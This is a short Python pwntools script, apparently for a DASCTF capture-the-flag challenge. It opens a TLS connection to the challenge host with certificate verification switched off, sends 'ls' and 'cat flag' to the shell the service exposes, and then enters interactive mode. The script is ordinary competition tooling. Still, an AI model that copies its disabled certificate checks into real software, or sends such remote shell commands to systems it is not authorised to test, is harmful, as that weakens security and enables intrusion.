from pwn import *
import ssl

# 手动创建一个 SSL 上下文，并关闭证书验证
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

host = "9347582521a0e3a4936fc5e1.tcp-ctf2.dasctf.com"
port = 9999

print(f"[*] 正在连接 {host}:{port}...")
p = remote(host, port, ssl=True, ssl_context=ssl_context, sni=host)

# 这道题连上就是一个 shell，直接发命令
p.sendline(b"ls")
p.sendline(b"cat flag")

# 进入交互模式，自己手动敲命令看结果
p.interactive()
